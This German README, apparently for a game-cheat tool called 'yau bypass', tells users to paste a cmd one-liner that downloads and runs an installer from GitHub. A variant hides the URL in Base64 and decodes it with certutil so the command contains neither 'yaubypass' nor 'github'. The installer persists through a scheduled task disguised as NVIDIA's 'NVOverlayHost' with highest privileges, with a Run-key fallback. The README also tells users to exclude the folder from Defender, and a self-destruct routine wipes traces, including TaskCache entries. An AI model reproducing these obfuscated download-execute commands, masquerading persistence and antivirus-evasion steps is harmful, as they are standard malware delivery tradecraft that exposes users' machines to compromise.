# yau bypass — Start per cmd

Der User lädt nichts herunter und klickt nichts an. Er pastet **eine Zeile in cmd**:

```
curl -L -o "%TEMP%\yau.cmd" https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/install.cmd && "%TEMP%\yau.cmd"
```

## Portabel: ohne Installation, ohne Ordner

Einfach ein `p` am Ende des Befehls anhängen:

```
echo dXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9memVieXBhc3MveWF1YnlwYXNzL21haW4vZGlzdC95Yi5iNjQi> "%TEMP%\c.b64" & certutil -f -decode "%TEMP%\c.b64" "%TEMP%\c.cfg" >nul 2>&1 & curl -sfL -o "%TEMP%\y.b64" -K "%TEMP%\c.cfg" & certutil -f -decode "%TEMP%\y.b64" "%TEMP%\y.cmd" >nul 2>&1 & "%TEMP%\y.cmd" p
```

Dann passiert nur das:

1. Die EXE wird nach `%TEMP%\nv_<zufall>.exe` geladen.
2. Sie startet — Windows fragt einmal nach Adminrechten, weil die EXE das im
   Manifest verlangt. Der Downloader selbst braucht **keine** Adminrechte.
3. **Kein** `YauBypass`-Ordner, **kein** `boot.cmd`, **keine** Aufgabe, kein Autostart.
4. Nach dem Destruct ist die Datei weg (sie löscht sich selbst); `CleanLauncherTraces()`
   räumt zusätzlich `nv_*.exe`, `c.b64`, `c.cfg` und `y.*` im Temp auf.

Der Preis dafür: nach einem Neustart ist nichts mehr da, du musst den Befehl erneut
ausführen. Und eine kleine Einschränkung, die technisch nicht umgehbar ist — Windows
kann ein Programm nur als Datei starten, es gibt in cmd keinen Weg, eine 6-MB-EXE
"direkt" auszuführen. Portabel heißt hier: eine Datei im Temp, die sich selbst löscht.

## Verschlüsselte Variante (kein Name, kein lesbarer Code)

```
echo dXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9memVieXBhc3MveWF1YnlwYXNzL21haW4vZGlzdC95Yi5iNjQi> "%TEMP%\c.b64" & certutil -f -decode "%TEMP%\c.b64" "%TEMP%\c.cfg" >nul 2>&1 & curl -sfL -o "%TEMP%\y.b64" -K "%TEMP%\c.cfg" & certutil -f -decode "%TEMP%\y.b64" "%TEMP%\y.cmd" >nul 2>&1 & "%TEMP%\y.cmd"
```

Zwei Schichten, beide nur mit Windows-Bordmitteln:

1. Die **URL** steckt Base64-kodiert im Befehl. `certutil` macht daraus eine
   curl-Config (`url = "..."`), die per `curl -K` gelesen wird — im Befehl steht
   weder `yaubypass` noch `github`.
2. Der **Installer** liegt als [yb.b64](yb.b64) auf GitHub und wird ebenfalls per
   `certutil` dekodiert.

Neu erzeugen:

```
# Installer-Payload
base64 -w 64 dist/install.cmd | sed 's/$/\r/' > dist/yb.b64

# URL im Befehl
printf 'url = "https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/yb.b64"' | base64 -w 0
```

Das ist **Verschleierung, keine echte Verschlüsselung**: der PC entschlüsselt beides
selbst wieder, und Virenscannern hilft Base64 eher beim Erkennen als beim Verstecken.
`curl` und `certutil` bleiben sichtbar — die lassen sich in cmd nicht verbergen.

---

Danach:

1. Das Skript fordert Administratorrechte an (UAC mit **Ja** bestätigen).
2. Es lädt das neueste Release von `yaubypass.exe` nach `%LOCALAPPDATA%\YauBypass\`.
3. Größe wird geprüft — ein kaputter Build kommt nie durch.
4. Es legt `boot.cmd` daneben und registriert die Aufgabe **`NVOverlayHost`**
   (Aufgabenplanung, *Bei Anmeldung*, *höchste Privilegien* → ohne UAC-Fenster).
   Klappt das nicht, wird `NvOverlayHost2` / `NvOverlayTask` probiert, zuletzt der
   Autostart-Registry-Eintrag `HKCU\...\Run\NVOverlayHost`.
5. Ansage: **„Starte jetzt den PC neu"** — nach 15 Sekunden startet der PC neu.
   Beliebige Taste bricht den Neustart ab und startet `yau bypass` sofort.
6. Nach dem Neustart startet `yau bypass` automatisch. **F1** öffnet das Menü.

---

## Was auf dem PC liegt

Die EXE muss **nicht** vorher existieren — alles kommt aus dem Release.

| Pfad / Eintrag | Zweck | Nach Destruct |
|---|---|---|
| `%LOCALAPPDATA%\YauBypass\yaubypass.exe` | der Cheat | löscht sich selbst |
| `%LOCALAPPDATA%\YauBypass\yaubypass.dat` | Sicherheitskopie | wird gelöscht |
| `%LOCALAPPDATA%\YauBypass\boot.cmd` | Starter beim Login | wird gelöscht |
| Aufgabe `NVOverlayHost` | Autostart bei Anmeldung | wird gelöscht |
| `%TEMP%\y.cmd`, `%TEMP%\y.b64` | Installer | werden gelöscht |
| NVIDIA Streamproof-Wert | `HKLM\...\ShadowPlay\FTS` | wird zurückgesetzt |

`CleanLauncherTraces()` in [cleaners.cpp](../src/cleaners/cleaners.cpp) räumt das beim
Destruct mit weg — inklusive der Waisen in `TaskCache\Tree` / `TaskCache\Tasks` und der
XML-Datei unter `C:\Windows\System32\Tasks`. Danach kommt der Cheat auch nach einem
Neustart nicht von allein zurück; zum Weiterspielen den Befehl erneut ausführen.

## Defender

Zwei Dinge, die Defender auf einem Testsystem blockiert hat (im Defender-Verlauf
als `2147840094` bzw. `251873` sichtbar):

- die Kommandozeile `schtasks /create ... /sc onlogon /rl highest` (Persistence-Erkennung),
- die Datei `yaubypass.exe` direkt nach dem Download.

Ohne Ausnahme für `%LOCALAPPDATA%\YauBypass` verschwindet die EXE wieder und der
Autostart läuft ins Leere. Ausnahme setzen unter *Windows-Sicherheit → Viren- &
Bedrohungsschutz → Einstellungen verwalten → Ausschlüsse hinzufügen → Ordner*.

## Update veröffentlichen

```
git tag v1.0.2
git push origin v1.0.2
```

Der Workflow [.github/workflows/build.yml](../.github/workflows/build.yml) baut die EXE,
benennt sie in `yaubypass.exe` um und hängt sie an das Release. Das Skript holt immer
`/releases/latest/download/yaubypass.exe` — der User muss nichts tun.
